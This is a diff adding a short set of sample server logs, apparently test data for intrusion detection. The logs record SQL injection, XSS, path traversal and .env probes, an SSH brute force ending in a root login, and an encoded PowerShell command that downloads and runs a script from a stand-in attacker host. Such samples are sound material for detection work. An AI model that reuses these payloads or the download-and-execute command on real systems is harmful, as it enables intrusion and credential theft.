@@ -1,0 +1,13 @@
+192.168.1.10 - - [03/Oct/2026:09:00:01 +0800] "GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
+192.168.1.11 - - [03/Oct/2026:09:00:05 +0800] "GET /about.html HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
+203.0.113.50 - - [03/Oct/2026:09:01:10 +0800] "GET /product?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 812 "-" "sqlmap/1.7.2"
+203.0.113.50 - - [03/Oct/2026:09:01:14 +0800] "GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1" 200 512 "-" "Mozilla/5.0"
+203.0.113.50 - - [03/Oct/2026:09:01:20 +0800] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 1024 "-" "curl/8.0"
+203.0.113.50 - - [03/Oct/2026:09:01:25 +0800] "GET /.env HTTP/1.1" 404 150 "-" "Nikto/2.5"
+Oct  3 09:05:01 webserver sshd[991]: Failed password for root from 198.51.100.7 port 4022 ssh2
+Oct  3 09:05:02 webserver sshd[991]: Failed password for admin from 198.51.100.7 port 4023 ssh2
+Oct  3 09:05:03 webserver sshd[991]: Failed password for root from 198.51.100.7 port 4024 ssh2
+Oct  3 09:05:04 webserver sshd[991]: Failed password for oracle from 198.51.100.7 port 4025 ssh2
+Oct  3 09:05:05 webserver sshd[991]: Failed password for root from 198.51.100.7 port 4026 ssh2
+Oct  3 09:05:09 webserver sshd[991]: Accepted password for root from 198.51.100.7 port 4030 ssh2
+{"timestamp":"2026-10-03T09:10:00Z","src_ip":"198.51.100.7","commandline":"powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALwBhAC4AcABzADEAJwApAA=="}
